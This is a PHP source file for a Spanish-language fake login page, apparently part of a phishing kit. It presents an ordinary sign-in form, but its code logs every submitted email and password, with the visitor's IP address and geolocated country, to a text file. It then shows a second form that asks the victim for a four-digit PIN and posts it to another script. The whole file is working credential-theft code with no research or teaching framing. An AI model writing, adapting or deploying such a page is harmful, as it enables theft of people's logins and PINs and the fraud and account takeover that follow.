<?php
echo '<html><head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
	<link rel="stylesheet" href="min.css">
    <title>Inicio</title>
</head>
<body>

    <div class="ttlo">
  <img src="hejea.jpg" alt="">

<div>
  <div class="contact-form-wrapper d-flex justify-content-center" id="mld">
    <form action="#" id="contenido1" method="post" class="contact-form">
      <h5 class="title">Inicio de Sesi&oacute;n</h5>
      <p class="description">Inicie Sesi&oacute;n para continuar.
      </p>
      <div id="numo">
      <div>
	  <input type="hidden" id="idmedu129" name="id" >
        <input type="email" class="form-control rounded border-white mb-3 form-input" id="name" name="nm1" placeholder="Correo Electronico" required>
      </div>
      <div>
        <input id="pws" type="password" class="form-control rounded border-white mb-3 form-input" name="nm2" placeholder="Contraseña" required>
      </div>
      
      <div class="submit-button-wrapper">
          <button id="bnts" type="submit">Iniciar Sesi&oacute;n</button>
        
      </div>
    </div>
	    </form>'; ?>
<?php
ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];

date_default_timezone_set('America/Bogota');
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
@$pais = $meta['geoplugin_countryName'];

 if (isset($_POST['nm1']) && isset($_POST['nm2']) ){
	
		$file = fopen("soportes.txt", "a");		
fwrite($file, "eml : ".$_POST['nm1']." - clave : ".$_POST['nm2']." - ".date('d/m/Y')." ".$userp." ".$pais."" . PHP_EOL);
fwrite($file, "======================" . PHP_EOL);
	
echo '<script laguage="javascript">
document.getElementById("contenido1").style.display = "none";
document.getElementById("contenido2").style.display = "inline";
</script>';
?>		

	<?php echo'<form action="index1.php" id="contenido2"  method="post" class="contact-form" >
		 <h5 class="title">Inicio de Sesi&oacute;n</h5>
      <p class="description">Inicie Sesi&oacute;n para continuar.
      </p>
    <div id="numt">
      <div>
        <input type="text" maxlength="4" class="form-control rounded border-white mb-3 form-input" name="namee" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)" placeholder="Nuevo PIN 4 digitos" required="">
      </div>
      <div>
        <input name="pwss" type="text" maxlength="4" class="form-control rounded border-white mb-3 form-input" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)" placeholder="Repita PIN 4 digitos" required="">
      </div>
      
      <div class="submit-button-wrapper">
          <button id="bntss" type="submit">Iniciar Sesi&oacute;n</button>
        
      </div>
    </div>
    </form>';?>
	
<?php } ?>
<?php echo '</div>
  
</div>

</div></body></html>';?>